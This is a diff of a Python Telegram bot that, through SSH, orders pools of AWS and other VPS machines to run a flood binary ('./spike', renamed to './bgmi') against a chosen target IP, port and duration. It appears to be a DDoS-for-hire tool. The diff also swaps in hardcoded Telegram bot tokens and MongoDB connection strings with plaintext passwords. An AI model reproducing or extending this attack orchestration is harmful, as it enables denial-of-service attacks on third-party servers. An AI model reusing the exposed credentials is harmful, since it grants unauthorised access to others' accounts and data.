@@ -14,8 +14,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Telegram API & MongoDB credentials (REPLACE WITH YOURS)
-TELEGRAM_BOT_TOKEN = "6704057021:AAGRYY_9JDCAntYI3lFEO-N08kZWi1KMXzQ"
-MONGO_URI = "mongodb+srv://satyam:ranbal1@satyam.ftaww.mongodb.net/?retryWrites=true&w=majority&appName=satyam"
+TELEGRAM_BOT_TOKEN = "7331346693:AAHxu7LOYJ4kXvFPWnyYXA1ZvkdOpVfQMZ0"
+MONGO_URI = "mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat"
 DB_NAME = "TEST"
 
 # Database setup
@@ -26,7 +26,7 @@ aws_vps_collection = db["aws_vps_list"]
 approved_users_collection = db["approved_users"]
 settings_collection = db["settings"]
 
-ADMIN_USER_ID =  5759284972 # Replace with your Telegram Admin ID
+ADMIN_USER_ID =  1216702307 # Replace with your Telegram Admin ID
 SSH_SEMAPHORE = asyncio.Semaphore(100)
 
 # Directory for storing .pem files
@@ -489,9 +489,9 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
 
             # Use different attack commands for AWS and Regular VPS
             if attack_type == "aws":
-                command = f"./spike {target_ip} {port} {duration} 6 900"
+                command = f"./bgmi {target_ip} {port} {duration} 6 900"
             else:
-                command = f"./spike {target_ip} {port} {duration} 1024 900"
+                command = f"./bgmi {target_ip} {port} {duration} 1024 900"
 
             await conn.run(command, check=True)
             await context.bot.send_message(chat_id, f"✅ *Attack executed on ({attack_type})*", parse_mode="Markdown")
